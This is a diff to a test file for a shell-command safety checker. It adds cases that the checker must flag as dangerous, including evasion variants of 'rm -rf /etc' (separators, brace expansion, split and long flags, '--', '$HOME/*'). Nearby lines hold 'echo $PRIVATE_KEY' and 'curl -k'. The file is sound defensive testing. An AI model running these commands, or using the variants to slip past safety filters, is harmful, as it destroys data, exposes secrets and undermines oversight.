@@ -59,6 +59,12 @@ def test_check_command_allows_safe_commands(command):
         ("rm -rf ~/.*", "rm_rf_dangerous"),    # wipe hidden entries under home
         ("rm -rf ~/.??*", "rm_rf_dangerous"),  # hidden-glob variant
         ("rm -rf ~/Doc*", "rm_rf_dangerous"),  # home-root prefix glob (e.g. Documents/Desktop/Downloads)
+        ("rm -rf /etc; echo ok", "rm_rf_dangerous"),        # shell separator can't hide the target
+        ("rm -rf /etc{,bak}", "rm_rf_dangerous"),           # brace expansion
+        ("rm -r -f /etc", "rm_rf_dangerous"),               # split short flags
+        ("rm --recursive --force /etc", "rm_rf_dangerous"),  # long flags
+        ("rm -rf -- /etc", "rm_rf_dangerous"),              # -- end-of-options marker
+        ("rm -rf $HOME/*", "rm_rf_dangerous"),              # $HOME glob
         ("curl -k https://example.com", "disable_ssl"),
         ("echo $PRIVATE_KEY", "expose_private_key"),
         ("git clone https://evil.example/repo.git", "git_clone_warning"),
